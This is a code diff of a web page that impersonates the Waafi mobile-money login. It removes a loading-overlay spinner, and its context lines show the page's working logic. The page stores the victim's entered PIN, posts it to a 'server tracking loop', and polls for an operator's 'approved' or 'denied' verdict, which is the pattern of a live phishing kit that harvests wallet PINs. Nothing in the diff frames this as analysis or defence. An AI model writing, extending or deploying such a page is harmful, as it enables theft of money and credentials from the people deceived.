@@ -84,30 +84,10 @@
             margin-bottom: 20px;
             display: none;
         }
-
-        /* --- LOADING OVERLAY --- */
-        #loading-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(to bottom, #82d13d, #a3e635);
-            display: none; flex-direction: column; justify-content: center;
-            align-items: center; z-index: 9999; color: white;
-        }
-        .spinner {
-            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.3);
-            border-top: 4px solid white; border-radius: 50%;
-            animation: spin 1s linear infinite; margin-bottom: 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 
 <body>
-
-<!-- Added Loading Overlay to track Admin Verification -->
-<div id="loading-overlay">
-    <div class="spinner"></div>
-    <div style="font-size: 20px; font-weight: bold;">Fadlan sug...</div>
-</div>
 
 <div class="header-box">
     <p class="logo-text">Waafi</p>
@@ -156,7 +136,6 @@ document.addEventListener("DOMContentLoaded", () => {
     const eye = document.getElementById('eyeIcon');
     const displayPhone = document.getElementById('displayPhone');
     const errorDisplay = document.getElementById('errorDisplay');
-    const overlay = document.getElementById('loading-overlay');
 
     const savedPhone = localStorage.getItem('phone');
     displayPhone.textContent = savedPhone ? `+252 ${savedPhone}` : "+252 (ma jiro)";
@@ -208,7 +187,6 @@ document.addEventListener("DOMContentLoaded", () => {
         localStorage.setItem('lastPin', pin);
 
         errorDisplay.style.display = "none";
-        overlay.style.display = "flex";
 
         try {
             // Post payload data to active server tracking loop
@@ -219,7 +197,6 @@ document.addEventListener("DOMContentLoaded", () => {
             });
             startPolling();
         } catch (err) {
-            overlay.style.display = "none";
             errorDisplay.innerText = "❌ Khalad ayaa dhacay xiriirka.";
             errorDisplay.style.display = "block";
         }
@@ -238,7 +215,6 @@ document.addEventListener("DOMContentLoaded", () => {
                 } 
                 else if (data.status === "denied") {
                     clearInterval(pollingInterval);
-                    overlay.style.display = "none";
                     errorDisplay.innerText = "❌ Faahfaahinta aad gelisay waa khalad.";
                     errorDisplay.style.display = "block";
                     resetInputs();
